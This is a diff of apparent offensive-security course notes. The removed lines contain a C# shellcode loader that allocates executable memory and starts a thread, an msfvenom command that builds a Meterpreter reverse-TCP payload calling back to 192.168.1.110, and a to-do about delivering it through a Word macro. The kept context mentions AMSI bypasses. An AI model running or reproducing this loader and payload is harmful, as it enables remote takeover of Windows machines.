@@ -262,64 +262,6 @@ static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
 static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 ```
 
-#### Example code 64-bit
-
-- set CPU arch to x64
-```c#
-using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-
-namespace ConsoleApp1
-{
-    class Program
-    {
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-        [DllImport("kernel32.dll")]
-        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-        static void Main(string[] args)
-        {
-            byte[] buf = new byte[630] {
-  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
-  ...
-  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
-
-            int size = buf.Length;
-
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
-
-            Marshal.Copy(buf, 0, addr, size);
-
-            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-        }
-    }
-}
-```
-
-- buf
-```bash 
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.110 LPORT=4444 EXITFUNC=thread -f csharp
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 511 bytes
-Final size of csharp file: 2628 bytes
-...
-
-```
-
 
 ### SharpShooter
 
@@ -560,6 +502,3 @@ AMSI is a Windows security feature that scans PowerShell code in memory. Reflect
 However, depending on how the PowerShell script is structured, AMSI might still intercept and scan portions of the PowerShell code. Some advanced offensive techniques attempt to **patch AMSI** in-memory (using tools like **AMSI bypasses**) before performing reflective loading.
 
 ---
-
-## TO DO:
-- Using what we have learned in these two modules, modify the C# and PowerShell code and use this technique from within a Word macro. Remember that Word runs as a 32-bit process.
